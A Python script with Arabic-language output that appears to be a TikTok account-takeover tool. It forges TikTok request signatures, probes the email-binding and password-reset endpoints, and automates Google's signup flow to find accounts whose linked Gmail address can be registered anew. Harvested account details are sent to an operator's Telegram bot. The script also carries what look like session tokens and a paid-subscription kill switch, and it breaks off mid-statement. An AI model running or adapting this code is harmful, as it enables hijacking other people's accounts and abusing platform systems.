import sys,os,requests
while True:
	try:
		de = requests.get("https://t.me/communication_Watan/29").text
		if "NN" not in de:
			print(" • توقفت الاداة للاشتراك راسلني خاص @Q_e_9 • ")
			sys.exit()
			exit()
			os._exit()
			raise SystemExit("تم إيقاف البرنامج")
			quit()
			exec("exit()")
		break 
	except:
		print("")		
#— — — — — — — — — — — — —
import sys, importlib, subprocess

def need(mod, pkg):
    try:
        importlib.import_module(mod)
    except ImportError:
        subprocess.call([sys.executable, "-m", "pip", "install", "--upgrade", pkg])

need("requests", "requests")
need("telebot", "pyTelegramBotAPI==3.7.7")
need("MedoSigner", "MedoSigner")
need("SignerPy", "SignerPy")

# بعد التأكد:
import os, sys, time, secrets, threading, string, uuid, random, re, json, binascii
from random import choice, randrange, randint
from uuid import uuid4
from urllib.parse import urlencode
import requests
import telebot
try:
    from MedoSigner import Argus, Gorgon, md5, Ladon
except ImportError:
    pass
try:
    import SignerPy
except ImportError:
    pass
	
os.system('clear');import telebot
Z = '\033[1;31m';X = '\033[1;33m';F = '\033[2;32m' ;C = "\033[1;97m";B = '\033[2;36m';Y = '\033[1;34m';C = "\033[1;97m";E = '\033[1;31m';B = '\033[2;36m';G = '\033[1;32m';S = '\033[1;33m'
idd=input(B+"Enter ID : ")
tok= input(B+"Enter Token : ")



nameee=['5ee5d7b8db9ea6adc488a6d8922f41db',
'5a7e7c83f61e6e0e1c3ca128cd3ee79a',
'401c36fc2d0abbdda740a52838cd31c2',
'a3b91f7d92a916ce843690a99f0c43ee',
'c46f26a1aa31f443e6b73a2baab4fcb4',
'a2e045e87922de8c8c5339b04cc23adb',
'987b534331cb8fe0426158e4f8f39124',
'9689fb7803f6b4b105e01eda4ab43667',
'e29d771a2cf7e0185e47a234d57c1808',
'40210b4815aa47f3d2cfeb45cf713bea',
'129eef9249b541845eba16fc14781582',
'6324058bdfe884515217ff4acb90073d',
'ff3c13526e2a360a1fefaca8c41e9ce3',
'220a3c08704e2d0a46c9d9b43854e682',
'1b1d59bf2bbe2458f5b9287c3b41af22',
'70b4866e3573692bdda7679e8e5d3939',
'a2e045e87922de8c8c5339b04cc23adb',
'508ac0dd034d89232616a44f62077380',
'2aa562d2463d90d723fac8d46b58246c',
'1b1d59bf2bbe2458f5b9287c3b41af22',
'90ba1ff26cf1fbca017d44a8be05f41d',
'e30441f84bebed5ab7fe0c81345b40cc',
'1c21012aa111369c85ff963c4bc30e29',
'e9191cf652801115dfd7cc9ce0754492',
'8b083ff40730e0cd42eb639598906af5',
'129eef9249b541845eba16fc14781582',
'f0aa37632755d7e04da7a77f54ea1519',
'c517f560947625ed86f27435282dd234',
'61705fae4cd68501d35123df3948656d',
'98106f1cebb49c19e8e0fa465ea2e979',
'536ae2abec9ed18942939af83296b8ef',
'9f0c1ac60c09af5a942bd5df9ae05cdf',
'a7739802b84434c4175225a907bc4df7',
'971d7038eb4ee04c7e52209ef7ee5755',
'2aa562d2463d90d723fac8d46b58246c',
'48399b568941080f90b6da6cc0f40b63',
'08af99cac4c0a488bf5500351ad31a50',
'e29d771a2cf7e0185e47a234d57c1808',
'48399b568941080f90b6da6cc0f40b63',
'e365a3aa9f85099e53c0ea46f946a567',
'508ac0dd034d89232616a44f62077380',
'14f1735a3ac77dc63e18a59bda77edee',
'e365a3aa9f85099e53c0ea46f946a567',
'07535b9405b8573072acc54136195a26',
'f0aa37632755d7e04da7a77f54ea1519',
'fcadc9245d341fc099ba5924100019ed',
'b6d6d6c88a2405fd025cf56ff7124473',
'6ac7cb6a6cd03bf5e8e9c5dbe2fa7b71',
'e64ed96b8c3ea51c4524b7dd25bf0abd',
'9f0c1ac60c09af5a942bd5df9ae05cdf',
'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
'31fffc2561f90d7780c034db4f458dad',
'e64ed96b8c3ea51c4524b7dd25bf0abd',
'f2a3ec8f71217f2fa2ed8507a8641920',
'6fa98a5d216b91fb49e8bd0f50b6dc29',
'3a19ad6aec83c77bf58ad20a95d87b02',
'ffea1b72a3de8ebb5c1e48c91d3886cc',
'c0ed975d7fab0b17ea77c9aac4772eda',
'62f665d8fef41027c569a264e39d1884',
'8799b7c86a83c99eb082e963e930b426',
'30ad5eb572241440c7f642ad07c3972e',
'3e815d7ed8d5ee5ed26394221cb94814',
'b521fc106d86884df7392b0d47094b42',
'70e134536c70bbd31b540bfb9abd9f16',
'a79666d0aedf81af7dec5e7302ce1a6a',
'59be59febf4f4e5ad3f01cd51b73c678',
'b18a44f1169bfdcd307474ceada8090c',
'46b49a9a910464297d4a2d703cfffb60',
'9b465c4456506e57cbe2f673fe3d748f',
'ecb67a58cf2f6a6b7e8341a8f4ec24f8',
'333c2f1fa9ccc31d05e3433f33379f23',
'1e5aa603077be314c594aa05c85a29c7',
'52a1a1b3ad87c9c4b13ee3522aa647f6',
'226d6f0f02dd07ea3e0e3c7e1a54ee98',
'f60c544b5014358574cd7df1c1751f42',
'b054149c7a2fa4681298030e91d0c033',
'fb32c6bfd5bdef0cd0b9e5c999cf9e46',
'11fbbcffb0525d52bc394389f24a936b',
'30514372833cc1b571f8dc8a0f55db94',
'88c024610ed4bf8ceb37cc92e78b4438',
'fc1f9672a6d4177993114198414be131',
'd8f6f9558e1807a1cd083f13de997693',
'fef15837eef02f1ebd56523240dd5be0',
'5e4e1267e08331d25ed7012d84f78243',
'32df03aa0a45104c29c0eb241bfaf052',
'277641c2bd68423af3c97ee64116c9ea',
'608e50f670227682805b6c4db9008025',
'f6c32b0881229967ea0e5c90635fa19e',
'8f68c10b8a60b64e8d2dd3fcb1cdc6be',
'497a97f73536f4f24831bebfed672258',
'6f7a25ed7db6c0620d7d4b1a1779813d',
'df9f5cef1f2d05757af659235150e5a6',
'f7e3313f4225c0bdf1ce635e80938a44',
'ab47913dc08abeb336556e9418449995',
'c3b41475865dd21e2a42be682cbbeec7',
'be5d43022279aae0fbb2810645e3a655',
'e1f1b7e764da963f9d0dfbc2f8c811fb',
'd0900ba89c1a62c7334db51b90d08046',
'5eccb0f11bda1f3744d306f7a1c2e4ee',
'871319a3e34f2034d5204f3e9d3fc9bc',
'b2874922a4fbc3bcc4863724e612a013',
'800266a1b9550a662a533bbe0a51edff',
'ac8cdd63d992feda7eb1be63cd5d3cbe',
'fe087743cb83b87fe511c4dcc2b54b9e',
'78cd438e41a1be9f27434a7ecb45d1f6',
'28797e6bb6e3b4a2924bdd17d5ac2c9d',
'ecbce30174a3109533e8c9db2b400e9f',
'de296140fdf052974d313dffaeac39a8',
'def6f7881ea24c7c6e2f2faafd749e33',
'5cd2eb39aadf7c11bc741131fefe8352',
'e2b90094da6ff546902b52c7cbcea7bb',
'b9d8b79367847fd9dfb8647bb96edd41',
'38df69157cd19f89825ad86e40533b3e',
'eb3fa50f60dd60f3a415f4d57d5c368d',
'8a9e4778c7074dc6497bce8fbc3e7be6',
'78f01b752b0e291c4177e2319871e5cd',
'f99638331ea251eba1dfae6ad3e331cd',
'1d5a8ad70fe1273483834fd99ba1cdee',
'531e7ed1aa699a929b313b8960677c07',
'36726a0145f85571c4d7919a564a330d',
'3e99fe2e40577af27dc4fb15f9b438f7',
'80b98f6c3b0e9eb1737f0fb96cb73e1d',
'99b2c615978200c679b321f04d314d49',
'6452b4925edad1b34284d9cf4887d281',
'475880946e2be5c2539a6c51746d2a27',
'12700e53ced122977a6705435f8dc433',
'99199284fc83817a51844b35e12b9a18',
'41dede88fec05de213462698b04ce27f',
'2c973cfb6559bc0369cefdbb75d5cbb7',
'98b6f608bcb1a1714f7d14ec97397dad',
'c33e3da3ec3b8e611625db85fb8ea360',
'dc7d2164919b5432676b4a8315d8f8b3',
'1edfd0dbb4f14549ead50fb19dc0dae3',
'771fc5bce51efef06174c5aa78fa896c',
'f2da58a0f3b534620e8ca7d070be1457',
'e0a008174fbb2f2c1923e7ca2d7ae0ba',
'160ca3c436693fcdc1165149c04d26c6',
'6b73e7069c58abfa77d72af913c75601',
'fb3ecd7a225441bcdf0f82a153976c51',
'959c67bd75dce25e3913ddbe7831013c',
'01d9a4ee761a44ab1f80d4554cc10301',
'98ac6a1ed1cea0cd7dd86da4ad548983',
'9e42fb4166611ce207b8bfcf8e76193d',
'f8448f180e37a6157b2fa6728929c858',
'300d027cc70fd71efa2dc4e1661bd053',
'28e5067ca59aefefe8a5716a4c257019',
'3c639274b33f920b4e2509382a26e737',
'114f488327fe3f9e0cb7e5d0c93e18da',
'd176247e0d0e5991755527960c9bac6e',
'f1b2fee1dd90c445fd9c91de64b3bdbb',
'd7f340e143dbb4eab73dd8f675d20b97',
'7013e9767ad43770d1a86cdd45b880e5',
'e370e7e1b0a0010360282d131c2d0613',
'63ab5a670d8d6a9fbd14f7d3fd0b30da',
'bc4d7382e95f3b9fa79d9164dac426e6',
'9b19bb4e743f4220cc05770ab88164af',
'f7a3b3d4b075b192cffd1beb30b813c7']




#input(f'{S}Write Name File Session :')



os.system('clear')
ya=0
no=0
nod=0
yas=0

kn=requests.get('https://raw.githubusercontent.com/zaid21ru/text/refs/heads/main/test').text

def rest(username):
	user=str(username)
	try:
		def xor(string: str) -> str:
		    return "".join([hex(ord(_) ^ 5)[2:] for _ in string])     
		params = {
		  'request_tag_from': "h5",
		  'fixed_mix_mode': "1",
		  'mix_mode': "1",
		  'account_param': xor(user),
		  'scene': "4",
		  'device_platform': "android",
		  'os': "android",
		  'app_version': "39.6.3",
		  'ssmix': "a",
		  '_rticket': str(time.time()).replace("-","")[:13],
		  'cdid': str(uuid.uuid4()),
		  'channel': "googleplay",
		  'aid': "1233",
		  'app_name': "musical_ly",
		  'version_code': "390603",
		  'version_name': "39.6.3",
		  'manifest_version_code': "2023906030",
		  'update_version_code': "2023906030",
		  'ab_version': "39.6.3",
		  'resolution': "1080*2220",
		  'dpi': "440",
		  'device_type': "Unknown",
		  'device_brand': "Unknown",
		  'language': "ar",
		  'os_api': "30",
		  'os_version': "11",
		  'ac': "mobile",
		  'is_pad': "0",
		  'current_region': "YE",
		  'app_type': "normal",
		  'sys_region': "EG",
		  'last_install_time': str(int(time.time()) - 4000),
		  'mcc_mnc': "42103",
		  'timezone_name': "Asia/Aden",
		  'residence': "YE",
		  'app_language': "ar",
		  'carrier_region': "YE",
		  'timezone_offset': "10800",
		  'host_abi': "arm64-v8a",
		  'locale': "ar",
		  'ac2': "lte",
		  'uoo': "0",
		  'op_region': "YE",
		  'build_number': "39.6.3",
		  'region': "EG",
		  'ts': str(int(time.time())),
		  'iid': str(random.randint(1, 10**19)),
		  'device_id': str(random.randint(1, 10**19)),
		  'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
		  'support_webview': "1",
		  'cronet_version': "a482972f_2025-04-03",
		  'ttnet_version': "4.2.228.11-tiktok",
		  'use_store_region_cookie': "1"
		}
		secret = secrets.token_hex(16)
		cookies = {
		    "passport_csrf_token": secret,
		    "passport_csrf_token_default": secret}
		headers = {
		  'User-Agent': "com.zhiliaoapp.musically/2023906030 (Linux; U; Android 11; ar; Unknown; Build/Unknown; Cronet/TTNetVersion:Unknown 2025-04-03 QuicVersion:Unknown 2025-04-03)",
		  'x-tt-passport-csrf-token': secret,
		  'Accept': "application/json, text/plain, */*",
		  'content-type': "application/x-www-form-urlencoded",
		  
		}
		signature = SignerPy.sign(params=params, cookie=cookies)
		headers.update({
		    'x-ss-req-ticket': signature['x-ss-req-ticket'],
		    'x-ss-stub': signature['x-ss-stub'],
		    'x-argus': signature["x-argus"],
		    'x-gorgon': signature["x-gorgon"],
		    'x-khronos': signature["x-khronos"],
		    'x-ladon': signature["x-ladon"],
		})
		
		response = requests.post("https://api16-normal-c-alisg.ttapis.com/passport/account_lookup/username/", params=params, headers=headers)
		tok = response.json()["data"]["accounts"][0]["passport_ticket"]
		params.update({'passport_ticket': tok})
		signature = SignerPy.sign(params=params, cookie=cookies)
		headers.update({
		    'x-ss-req-ticket': signature['x-ss-req-ticket'],
		    'x-ss-stub': signature['x-ss-stub'],
		    'x-argus': signature["x-argus"],
		    'x-gorgon': signature["x-gorgon"],
		    'x-khronos': signature["x-khronos"],
		    'x-ladon': signature["x-ladon"],
		})
		res = requests.post("https://api16-normal-c-alisg.ttapis.com/passport/user/login_by_passport_ticket/", params=params, headers=headers)	
		rest = re.search(r'"info":"(.*?)"', str(res.headers)).group(1)
		return rest
	except:
		return "Rest is not available !"
	
def info(email):
    username=email.split("@")[0]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    }    
    try:
        url = f"https://www.tiktok.com/@{username}"
        response = requests.get(url, headers=headers)
        response.raise_for_status()        
        html_content = response.text
        data_pattern = re.compile(r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__".*?>(.*?)</script>')
        match = data_pattern.search(html_content)
        
        if not match:
            ff=f'''
— — — — — — — — — — — — —
< Username - {user} >
< Email - {email} >
< Def - @Q_e_9 >
— — — — — — — — — — — — —
    '''
            requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")  
            return
            
        data = json.loads(match.group(1))
        
        iinfo = data['__DEFAULT_SCOPE__']['webapp.user-detail']['userInfo']
        user = iinfo['user']
        stats = iinfo['stats']
        
        account_data = {
            'id': user.get('id', 'N/A'),
            'user': user.get('uniqueId', 'N/A'),
            'name': user.get('nickname', 'N/A'),
            'folos': format(stats.get('followerCount', 0), ',d'),
            'folon': format(stats.get('followingCount', 0), ',d'),
            'priv': 'نعم' if user.get('privateAccount', False) else 'لا',
            'lik': format(stats.get('heartCount', 0), ',d'),
            'vid': format(stats.get('videoCount', 0), ',d'),
            'verified': 'موثق' if user.get('verified', False) else 'غير موثق'
        }        
        ff = f"""
— — — — — — — — — — — — —
< Name - {account_data['name']} >
< Username - @{account_data['user']} >
< Email - {email} >
< Reset - {rest(username)} >
— — — — — — — — — — — — —
< Followers - {account_data['folos']} >
< Following - {account_data['folon']} >
< Likes - {account_data['lik']} >
< Id - {account_data['id']} >
< Private - {account_data['priv']} >
< Videos - {account_data['vid']} >
< Verified - {account_data['verified']} >
< Def - @Q_e_9 >
— — — — — — — — — — — — —
        """
        print(ff)
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")
        with open('working_sessions.txt', 'a') as f:
        	f.write("\n" + ff)
    except requests.exceptions.RequestException as e:
        ff=f'''
— — — — — — — — — — — — —
< Username - {user} >
< Email - {email} >
< Def - @Q_e_9 >
— — — — — — — — — — — — —
    '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")  
        print(f" خطأ: {str(e)}")
    except json.JSONDecodeError:
       ff=f'''
— — — — — — — — — — — — —
< Username - {user} >
< Email - {email} >
< Def - @Q_e_9 >
— — — — — — — — — — — — —
    '''
    
       requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")   
       print(f" خطأ: {str(e)}")
    except Exception as e:
        ff=f'''
— — — — — — — — — — — — —
< Username - {user} >
< Email - {email} >
< Def - @Q_e_9 >
— — — — — — — — — — — — —
    '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=<b>{ff}</b>&parse_mode=HTML")   
        print(f" خطأ: {str(e)}")
def check_gmail(email):
    global ya,no,yas,nod
    if '@' in email:email=email.split('@')[0]
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False
    s = requests.Session()
    try:
            headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://accounts.google.com/',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-browser-channel': 'stable',
    'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
    'x-browser-year': '2024',
}
            params = {
    'biz': 'false',
    'continue': 'https://mail.google.com/mail/u/0/',
    'ddm': '1',
    'emr': '1',
    'flowEntry': 'SignUp',
    'flowName': 'GlifWebSignIn',
    'followup': 'https://mail.google.com/mail/u/0/',
    'osid': '1',
    'service': 'mail',
}
            response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
            tl=response.url.split('TL=')[1]
            s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
            at = response.text.split('"SNlM0e":"')[1].split('"')[0]
            pass
    except:''
    try:
            name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'E815hb',
    'source-path': '/lifecycle/steps/signup/name',
    'hl': 'en-US',
    'TL': tl,
    'rt': 'c',
}
            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)
            response = s.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    headers=headers,
    data=data,
).text
            if 'steps/signup/birthdaygender' in response:
                pass
    except:''
    try:
            birthday = randrange(1980,2010),randrange(1,12),randrange(1,28)
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'eOY7Bb',
    'source-path': '/lifecycle/steps/signup/birthdaygender',
    'hl': 'en-US',
    'TL': tl,
    'rt': 'c',
}
            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)
            response = s.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    headers=headers,
    data=data,
).text
            if 'steps/signup/username' in response:
                pass
    except:''
    try:
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'NHJMOd',
    'source-path': '/lifecycle/steps/signup/username',
    'hl': 'en-US',
    'TL': tl,
    'rt': 'c',
}
            data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
            response = s.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    headers=headers,
    data=data,
).text
            email=email+'@gmail.com'
            if 'steps/signup/password' in response:
            	yas+=1
            	os.system('clear')
            	sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
 < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
 < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
 < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
 < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
 < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
\033[1;35m - — — — — — — — — — — — — —\033[0m
''');sys.stdout.flush()
            	info(email)
            else:
            	os.system('clear')
            	nod+=1
            	sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
 < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
 < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
 < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
 < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
 < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
\033[1;35m - — — — — — — — — — — — — —\033[0m
''');sys.stdout.flush()
            print(response)
    except:print('gg')



def chzm(email,cookies):
	global ya,no,yas,nod
	def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
	       x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
	       data=payload
	       if not unix: unix = int(time.time())
	       return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}		


	params={
	
    'aid': '1233',
   'app_language': 'ar',
    'device_id': str(random.randint(1, 10**19)),
    'device_platform': 'android',
    'iid': str(random.randint(1, 10**19)),
    'version_name': str(random.randint(1, 10**19)),
    'use_store_region_cookie': '1',
    'version_code': str(random.randint(1, 10**19)),
}
	he = {
        'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{str(random.randint(1, 10**19))})',
        }

	data=f'email={email}'
	x_log = x_log = sign(urlencode(params), data,  str(uuid.uuid4()) + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
	he.update(x_log)
	res=requests.post(f'https://{random.choice(["inapp.tiktokv.com","api2.musical.ly","api16-normal-c-alisg.tiktokv.com","api2-19-h2.musical.ly"])}/passport/email/bind_without_verify/',data=data,headers=he,params=params,cookies=cookies).text
	sys.stdout.write(f'\r{res}');sys.stdout.flush()
	if "فشل في الربط، تم ربط صندوق البريد بالحساب الآخر"in res:
		os.system('clear')
		ya+=1
		sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
 < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
 < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
